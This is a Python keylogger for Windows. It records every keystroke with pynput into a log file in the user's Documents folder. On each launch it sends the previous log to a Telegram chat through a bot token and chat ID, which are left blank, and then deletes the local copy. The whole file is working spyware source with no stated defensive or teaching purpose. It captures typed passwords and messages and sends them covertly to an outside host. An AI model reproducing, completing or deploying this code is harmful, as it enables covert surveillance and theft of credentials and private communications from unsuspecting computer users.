import os
import getpass
from datetime import datetime

import telebot
from pynput import keyboard

token = ''
chatID = ''
mainstr = ''
path = f'C:/Users/{getpass.getuser()}/Documents'

def send(filename):
    bot = telebot.TeleBot(token)
    bot.send_document(chatID, filename)

if os.path.exists(f'{path}/log.txt'):
    date = datetime.now()
    name = f'{os.getlogin()} {date.year}-{date.month}-{date.day} {date.hour}:{date.minute}.txt'
    os.rename(f'{path}/log.txt', name)
    send(name)
    os.remove(name)

with open(f'{path}/log.txt', 'w+') as file:
    file.write(f'{os.getlogin()}\n')

def on_press(key):
    write = ''
    if type(key) != type(keyboard.Key.alt):
        if key.char != None:
            write += key.char
    elif key == keyboard.Key.space:
        write += ' '
    elif key == keyboard.Key.backspace:
        write = '<-'
    elif key == keyboard.Key.enter:
        write = '\n'
    
    with open(f'{path}/log.txt', 'at') as file:
        file.write(f'{write}')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()